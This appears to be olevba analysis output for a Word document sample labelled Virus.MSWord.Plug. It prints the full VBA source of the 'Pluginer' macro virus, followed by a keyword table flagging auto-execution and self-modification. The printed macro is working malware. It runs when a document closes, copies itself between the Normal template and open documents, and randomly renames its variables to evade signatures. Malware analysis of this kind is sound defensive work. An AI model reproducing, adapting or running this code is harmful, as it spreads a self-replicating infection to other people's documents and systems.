olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Plug-fd44721506b1c104494002f79bd13a9e26ef8635
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Plug-fd44721506b1c104494002f79bd13a9e26ef8635 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Pluginer
Private Sub Document_Close()
'1
 On Error Resume Next
 nphhua_ = "'Pluginer"
 Set vsbkwuj_ = NormalTemplate.VBProject.VBComponents(1).CodeModule
 Set wbyjntbp_ = ActiveDocument.VBProject.VBComponents(1).CodeModule
 Set hqqgh_ = MacroContainer
 If vsbkwuj_.lines(1, 1) = nphhua_ And wbyjntbp_.lines(1, 1) = nphhua_ Then
   If hqqgh_.Name = NormalTemplate Then
     Call CheckSubs(vsbkwuj_, wbyjntbp_)
    Else
     Call CheckSubs(wbyjntbp_, vsbkwuj_)
   End If
  Else
   If vsbkwuj_.lines(1, 1) = nphhua_ Then
     wbyjntbp_.DeleteLines 1, wbyjntbp_.countoflines
     vpzxfsz_ = mutate(vsbkwuj_.lines(1, vsbkwuj_.countoflines))
     wbyjntbp_.insertLines 1, vpzxfsz_
    Else
     vsbkwuj_.DeleteLines 1, vsbkwuj_.countoflines
     vpzxfsz_ = mutate(wbyjntbp_.lines(1, wbyjntbp_.countoflines))
     vsbkwuj_.insertLines 1, vpzxfsz_
   End If
 End If
End Sub
Private Sub CheckSubs(ncz_, aoccuh_)
'1
 On Error Resume Next
 Dim hj_(255), yzkh_(255), eqk_(255), siqf_(255), pcl_(255), gujhxqql_(255), os_(255), vaoxlrnn_(255)
 jkhbg_ = 1: bkjmemgq_ = 1: eyrnk_ = 0: ul_ = 0
 Do
  pvafbci_ = GetSubName(aoccuh_, bkjmemgq_, an_, ovcerl_, dsyn_)
  tk_ = GetSubName(ncz_, jkhbg_, mficp_, ycl_, wth_)
  If pvafbci_ <> "" Then
   eyrnk_ = eyrnk_ + 1: hj_(eyrnk_) = pvafbci_: eqk_(eyrnk_) = an_
   pcl_(eyrnk_) = ovcerl_: os_(eyrnk_) = dsyn_
  End If
  If tk_ <> "" Then
   ul_ = ul_ + 1: yzkh_(ul_) = tk_: siqf_(ul_) = mficp_
   gujhxqql_(ul_) = ycl_: vaoxlrnn_(ul_) = wth_
  End If
 Loop While pvafbci_ <> "" Or tk_ <> ""
 For gcaiuh_ = 1 To ul_
  mgi_ = 0
  For mf_ = 1 To eyrnk_
   If hj_(mf_) = yzkh_(gcaiuh_) Then
    mgi_ = 1
    If os_(mf_) < vaoxlrnn_(gcaiuh_) Then
     aoccuh_.DeleteLines eqk_(mf_), pcl_(mf_)
     aoccuh_.insertLines 2, ncz_.lines(siqf_(gcaiuh_), gujhxqql_(gcaiuh_))
    End If
   End If
  Next
  If mgi_ = 0 Then aoccuh_.insertLines 2, ncz_.lines(siqf_(gcaiuh_), gujhxqql_(gcaiuh_))
 Next
End Sub
Private Function GetSubName(aoccuh_, bkjmemgq_, an_, ovcerl_, dsyn_)
'1
 On Error Resume Next
 mgi_ = 0: an_ = 0: ovcerl_ = 0: ptyiocqk_ = "": dsyn_ = 0
 Do
  cyqjdmfz_ = aoccuh_.lines(bkjmemgq_, 1): gcaiuh_ = 1
  Do
   If gcaiuh_ <= Len(cyqjdmfz_) - 6 Then
    If UCase(Mid(cyqjdmfz_, gcaiuh_, 5)) = " SUB" + " " And (gcaiuh_ + 5) < Len(cyqjdmfz_) Then
     mgi_ = 1: gcaiuh_ = gcaiuh_ + 4
    End If
    If UCase(Right(cyqjdmfz_, 5)) = "D SU" + "B" Then mgi_ = 4: ovcerl_ = bkjmemgq_ - an_ + 1
   End If
   If gcaiuh_ <= Len(cyqjdmfz_) - 10 Then
    If UCase(Mid(cyqjdmfz_, gcaiuh_, 10)) = " FUNCTION" + " " And (gcaiuh_ + 9) < Len(cyqjdmfz_) Then
     mgi_ = 1: gcaiuh_ = gcaiuh_ + 9
    End If
    If UCase(Right(cyqjdmfz_, 10)) = "D FUNCTIO" + "N" Then mgi_ = 4: ovcerl_ = bkjmemgq_ - an_ + 1
   End If
   If mgi_ = 2 Then
    ptyiocqk_ = ptyiocqk_ + Mid(cyqjdmfz_, gcaiuh_, 1)
    If UCase(Mid(cyqjdmfz_, gcaiuh_ + 1, 1)) >= "A" And UCase(Mid(cyqjdmfz_, gcaiuh_ + 1, 1)) <= "Z" Then
      mgi_ = 2
     Else
      If Mid(cyqjdmfz_, gcaiuh_ + 1, 1) >= "0" And Mid(cyqjdmfz_, gcaiuh_ + 1, 1) <= "9" Then mgi_ = 2 Else mgi_ = 3
    End If
   End If
   If mgi_ = 1 Then an_ = bkjmemgq_: mgi_ = 2: dsyn_ = Val(Right(aoccuh_.lines(an_ + 1, 1), Len(aoccuh_.lines(an_ + 1, 1)) - 1))
   gcaiuh_ = gcaiuh_ + 1
  Loop While gcaiuh_ <= Len(cyqjdmfz_)
  If bkjmemgq_ > aoccuh_.countoflines Then mgi_ = 4
  bkjmemgq_ = bkjmemgq_ + 1
 Loop While mgi_ <> 4
 GetSubName = ptyiocqk_
End Function
Private Function mutate(ai_)
'1
 On Error Resume Next
 Dim xnkwv_(500), szimks_(500)
 kov_ = 0: gcaiuh_ = 1
 Do While gcaiuh_ <= Len(ai_)
  If Mid(ai_, gcaiuh_, 1) = Chr(95) Then
   mgi_ = CheckUp(Mid(ai_, gcaiuh_ + 1, 1))
   If mgi_ = 3 Then
    mf_ = gcaiuh_ - 1: lnfqm_ = ""
    Do
     lnfqm_ = Mid(ai_, mf_, 1) + lnfqm_
     mf_ = mf_ - 1
     xjhhdn_ = CheckUp(Mid(ai_, mf_, 1))
    Loop While xjhhdn_ = 2
    xjhhdn_ = 0
    For pjw_ = 1 To kov_
     If xnkwv_(pjw_) = lnfqm_ Then xjhhdn_ = 1
    Next
    If xjhhdn_ = 0 Then
     kov_ = kov_ + 1: xnkwv_(kov_) = lnfqm_
     ertpu_ = 0
     Do
      lnfqm_ = GetNR()
      For pjw_ = 1 To kov_
       If lnfqm_ = szimks_(pjw_) Then ertpu_ = 1
      Next
     Loop While ertpu_ <> 0
     szimks_(kov_) = lnfqm_
    End If
   End If
  End If
  gcaiuh_ = gcaiuh_ + 1
 Loop
 vfy_ = "": gcaiuh_ = 1
 Do While gcaiuh_ <= Len(ai_)
  If Mid(ai_, gcaiuh_, 1) = Chr(95) Then
   mgi_ = CheckUp(Mid(ai_, gcaiuh_ + 1, 1))
   If mgi_ = 3 Then
    mf_ = gcaiuh_ - 1: lnfqm_ = ""
    Do
     lnfqm_ = Mid(ai_, mf_, 1) + lnfqm_
     mf_ = mf_ - 1
     xjhhdn_ = CheckUp(Mid(ai_, mf_, 1))
    Loop While xjhhdn_ = 2
    For pjw_ = 1 To kov_
     If xnkwv_(pjw_) = lnfqm_ Then xjhhdn_ = pjw_
    Next
    mf_ = Len(vfy_)
    Do While CheckUp(Mid(vfy_, mf_, 1)) = 2
     mf_ = mf_ - 1
    Loop
    vfy_ = Left(vfy_, mf_) + szimks_(xjhhdn_)
   End If
  End If
  vfy_ = vfy_ + Mid(ai_, gcaiuh_, 1)
  gcaiuh_ = gcaiuh_ + 1
 Loop
 mutate = vfy_
End Function
Private Function CheckUp(cyqjdmfz_)
'1
 On Error Resume Next
 If UCase(Mid(cyqjdmfz_, gcaiuh_ + 1, 1)) >= "A" And UCase(Mid(cyqjdmfz_, gcaiuh_ + 1, 1)) <= "Z" Then
   mgi_ = 2
  Else
   If Mid(cyqjdmfz_, gcaiuh_ + 1, 1) >= "0" And Mid(cyqjdmfz_, gcaiuh_ + 1, 1) <= "9" Then mgi_ = 2 Else mgi_ = 3
 End If
 CheckUp = mgi_
End Function
Private Function GetNR()
'1
On Error Resume Next
 bu_ = ""
 For gcaiuh_ = 1 To Int(Rnd * 7) + 2
  bu_ = bu_ + Chr(97 + Int(Rnd * 26))
 Next
 GetNR = bu_
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
